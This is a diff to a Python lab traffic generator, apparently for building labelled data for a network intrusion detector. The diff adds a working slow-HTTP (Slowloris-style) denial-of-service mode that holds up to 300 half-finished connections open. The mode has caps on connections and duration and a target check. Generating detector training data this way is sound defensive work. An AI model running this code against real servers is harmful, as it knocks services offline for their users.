@@ -26,6 +26,9 @@ Ví dụ (mỗi lệnh chạy trên một máy của lab; đích luôn là máy 
     # Kịch bản 3 — tải kết nối 60 giây, mức tải trung bình
     python scripts/sinh_traffic.py tai-ket-noi --may-chu 192.168.50.30 --cong 80 --muc 2 --thoi-gian 60 \
         --vai-tro train --lan 01
+    # Biến thể DoS HTTP chậm — giữ 150 kết nối mở, mỗi ~10 giây gửi thêm một dòng header, tối đa 60 giây
+    python scripts/sinh_traffic.py dos-cham --may-chu 192.168.50.30 --cong 80 --so-ket-noi 150 --thoi-gian 60 \
+        --vai-tro test --lan 01
 
 Thêm ``--thu`` để chỉ in kế hoạch, không gửi gì. ``--seed`` để lặp lại lịch.
 """
@@ -152,6 +155,54 @@ def run_conn_load(host, port, level, duration, rng, dry):
             "so_lan_thu": attempts, "so_lan_noi_duoc": done}
 
 
+SLOW_MAX_CONN = 300              # DoS HTTP chậm: trần số kết nối giữ mở (máy chủ lab có 4 096 chỗ)
+
+
+def run_slow_http(host, port, conns, interval, duration, rng, dry):
+    """DoS HTTP chậm mô phỏng: mở nhiều kết nối, gửi yêu cầu GET **chưa xong** (thiếu dòng trống cuối), rồi cứ
+    ``interval`` giây gửi thêm một dòng header vô hại để máy chủ giữ kết nối.
+
+    An toàn: socket TCP thường, chỉ một máy chủ của lab, header vô hại, số kết nối có trần SLOW_MAX_CONN và thời
+    gian bị chặn cứng ở DOS_MAX_S như tải kết nối (B16, B24). Hết giờ thì đóng mọi kết nối."""
+    duration, conns = min(duration, DOS_MAX_S), min(conns, SLOW_MAX_CONN)
+    if dry:
+        return {"so_ket_noi": conns, "gian_cach_s": interval, "thoi_gian_s": duration}
+    start, socks, opened, sent = time.time(), [], 0, 0
+
+    def open_one():
+        nonlocal opened
+        try:
+            s = socket.create_connection((host, port), timeout=2.0)
+            s.sendall(f"GET /?{rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: nids-lab\r\n".encode())
+            socks.append(s)
+            opened += 1
+        except OSError:
+            pass
+
+    for _ in range(conns):
+        open_one()
+        if time.time() - start >= duration:
+            break
+    while time.time() - start < duration:
+        time.sleep(max(0.0, min(interval * rng.uniform(0.8, 1.2), duration - (time.time() - start))))
+        for s in list(socks):
+            try:
+                s.sendall(f"X-a: {rng.randrange(5000)}\r\n".encode())
+                sent += 1
+            except OSError:
+                socks.remove(s)
+                s.close()
+        while len(socks) < conns and time.time() - start < duration:    # máy chủ đóng bớt thì mở lại
+            before = len(socks)
+            open_one()
+            if len(socks) == before:
+                break
+    for s in socks:
+        s.close()
+    return {"so_ket_noi": conns, "gian_cach_s": interval, "thoi_gian_s": round(time.time() - start, 1),
+            "so_lan_mo": opened, "so_dong_header": sent}
+
+
 def main(argv=None):
     parser = argparse.ArgumentParser(description="Sinh traffic lab vô hại cho kịch bản 1–3 (chỉ trong mạng lab).")
     sub = parser.add_subparsers(dest="kieu", required=True)
@@ -173,6 +224,13 @@ def main(argv=None):
     p.add_argument("--muc", type=int, choices=tuple(DOS_LEVELS), required=True)
     p.add_argument("--thoi-gian", type=float, default=60.0)
 
+    p = sub.add_parser("dos-cham", help="DoS HTTP chậm: giữ nhiều kết nối mở, tối đa 60 giây")
+    p.add_argument("--may-chu", required=True)
+    p.add_argument("--cong", type=int, default=80)
+    p.add_argument("--so-ket-noi", type=int, default=150)
+    p.add_argument("--gian-cach", type=float, default=10.0, help="giây giữa hai lần gửi thêm header")
+    p.add_argument("--thoi-gian", type=float, default=60.0)
+
     for p in sub.choices.values():
         p.add_argument("--vai-tro", choices=("train", "val", "test"), required=True,
                        help="vai trò lần chạy, phải ghi trước khi chạy (B11, B19)")
@@ -185,7 +243,7 @@ def main(argv=None):
     host = check_target(a.may_chu)
     variant = {"binh-thuong": "k1-binh-thuong",
                "quet": None,            # điền bên dưới theo tốc độ
-               "tai-ket-noi": None}[a.kieu]
+               "tai-ket-noi": None, "dos-cham": "x3-dos-cham"}[a.kieu]
     if a.kieu == "quet":
         variant = "k2-quet-cham" if a.toc_do == "cham" else "k2-quet-nhanh"
     elif a.kieu == "tai-ket-noi":
@@ -199,11 +257,15 @@ def main(argv=None):
     elif a.kieu == "quet":
         result = run_scan(host, a.cong_dau, a.cong_cuoi, SCAN_RATES[a.toc_do], a.thu)
         params = {"cong_dau": a.cong_dau, "cong_cuoi": a.cong_cuoi, "toc_do": a.toc_do}
+    elif a.kieu == "dos-cham":
+        result = run_slow_http(host, a.cong, a.so_ket_noi, a.gian_cach, a.thoi_gian, rng, a.thu)
+        params = {"cong": a.cong, "so_ket_noi": min(a.so_ket_noi, SLOW_MAX_CONN), "gian_cach_s": a.gian_cach,
+                  "thoi_gian": min(a.thoi_gian, DOS_MAX_S)}
     else:
         result = run_conn_load(host, a.cong, a.muc, a.thoi_gian, rng, a.thu)
         params = {"cong": a.cong, "muc": a.muc, "thoi_gian": min(a.thoi_gian, DOS_MAX_S)}
 
-    label = {"binh-thuong": "benign", "quet": "port_scan", "tai-ket-noi": "dos"}[a.kieu]
+    label = {"binh-thuong": "benign", "quet": "port_scan", "tai-ket-noi": "dos", "dos-cham": "dos"}[a.kieu]
     entry = {"ma_lan_chay": run_id, "bien_the": variant, "vai_tro": a.vai_tro, "kieu": a.kieu,
              "nhan": label, "bat_dau": began.isoformat(timespec="seconds"),
              "ket_thuc": datetime.datetime.now().astimezone().isoformat(timespec="seconds"),
